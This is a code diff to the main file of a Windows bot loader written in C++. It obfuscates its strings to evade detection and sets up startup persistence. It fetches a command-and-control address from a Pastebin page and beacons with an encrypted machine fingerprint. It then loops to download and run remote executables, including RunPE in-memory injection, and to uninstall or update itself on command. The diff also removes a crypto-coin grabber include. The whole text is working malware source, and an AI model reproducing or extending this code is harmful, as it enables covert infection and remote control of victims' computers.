@@ -13,7 +13,6 @@
 #include "config.h"
 #include <conio.h>
 #include "obfuscat.h"
-#include "CoinFinder.h"
 #include <atlbase.h>
 #include <wtypes.h>
 #include <comutil.h>
@@ -21,6 +20,7 @@
 #include "OsHelpers.hpp"
 #include "XOR.h"
 #include "spiderrun.h"
+#include "Client.h"
 
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
@@ -47,14 +47,16 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		Config config;
 	
 		//Check if the Bot is Running
-		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
+		std::string mutex = OBFUSCATE("Local\\") + config.mutex;
+		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
 		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
 			return -1; // quit; mutex is released automatically
+
 
 		//Autostart  (with persistence) && Clone
 		if (config.startup == true) {
 			std::string insatlled = Helpers::installedOrnot();
-			if (insatlled == "restart") {
+			if (insatlled == OBFUSCATE("restart")) {
 				return 0;
 			}
 			std::thread startupPersistence(Helpers::addstartup);
@@ -65,94 +67,54 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 	
 		//Fetch Gate from raw Site
 		http::Request request(config.pastebinUrl);
-		http::Response response = request.send("GET");
+		http::Response response = request.send(OBFUSCATE("GET"));
 		std::string gateFromPatebin = XOR::encryptDecrypt(Helpers::responseToString(response));
-		//Net Framwork Check
-		std::string netFramework2 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
-		std::string netFramework3 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
-		std::string netFramework35 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
-		std::string netFramework4 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
-		// Start Coin Grabber
-		//std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
-		//std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
+	
+
+
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
-		std::string args = "hwid=" + guid +
-			"&computername=" + Helpers::getComputerName() +
-			"&cpuName=" + OsHelpers::getCpuName() +
-			"&aornot=" + OsHelpers::checkPEIsAdmin() +
-			"&gpuName=" + OsHelpers::getCpuName() +
-			"&prcessorArchitecture=" + OsHelpers::PrcessorArchitecture() +
-			"&installedRam=" + OsHelpers::getRam() +
-			"&netFramework2=" + netFramework2 +
-			"&netFramework3=" + netFramework3 +
-			"&netFramework35=" + netFramework35 +
-			"&netFramework4=" + netFramework4 +
-			"&antivirus=" + Helpers::getCurrentAv() +
-			"&botversion=2.1" +
-			"&operingsystem=" + Helpers::GetWindowsVersionString();
-		std::string finalPost = "request="+XOR::encryptReqeust(args);
+		std::string finalPost = Client::returnFinalPost();
+
 		while (true) {
 			try {
-				http::Request request2(gateFromPatebin);
-				http::Response respons2e = request2.send("POST",
-					finalPost,
-					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
-				);
-				std::string responseFromGate = Helpers::responseToString(respons2e);
 
-				if (responseFromGate.find("dande") != std::string::npos) {
-					//New task Found
+				std::string responseFromGate = Client::sendPost(gateFromPatebin, finalPost);
+
+				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 					std::string random_str = Helpers::RandomString(10);
 					std::string url(v[2]);
-					std::string file((std::string)getenv("TEMP") + "\\" + random_str + ".exe");
+					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
 					Helpers::downloadFile(url, file);
 					std::string started = Helpers::startNewProcess(file);
-					http::Request request2(gateFromPatebin);
-					http::Response respons2e = request2.send("POST",
-						"hwid=" + guid +
-						"&taskstatus=" + started +
-						"&taskid=" + v[0],
-						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
-					);
-				}else if (responseFromGate.find("runpe") != std::string::npos) {
-						//New task Found
+					Client::sendPost(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0]);
+				}else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
 						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 						std::string url(v[2]);
 						LPVOID FileData = DownloadURLToBuffer(url.c_str());
 						bool runned = NTRX_RUNPE32(FileData);
-						std::string started = "failed";
+						std::string started = OBFUSCATE("failed");
 						if(runned){
-							 started = "success";
+							 started = OBFUSCATE("success");
 						}
-						http::Request request2(gateFromPatebin);
-						http::Response respons2e = request2.send("POST",
-							"hwid=" + guid +
-							"&taskstatus=" + started +
-							"&taskid=" + v[0],
-							{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
-						);
+						Client::sendPost(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0]);
 					}
 				else {
-					if (responseFromGate.find("uninstall") != std::string::npos) {
-						//t1.detach();
-						//t2.detach();
+					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
 						Helpers::uninstall();
 						return 0;
 					}
-					else if (responseFromGate.find("update") != std::string::npos) {
+					else if (responseFromGate.find(OBFUSCATE("update")) != std::string::npos) {
 						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
-						//t1.detach();
-						//t2.detach();
 						Helpers::update(v[2]);
 						return 0;
 					}
-					// Else No new Task
+
 				}
 			}
 			catch (const std::exception & e) {
-				std::cerr << "Request failed, error: " << e.what() << std::endl;
+				std::cerr << OBFUSCATE("Request failed, error: ") << e.what() << std::endl;
 			}
 			
 			Sleep(10000);
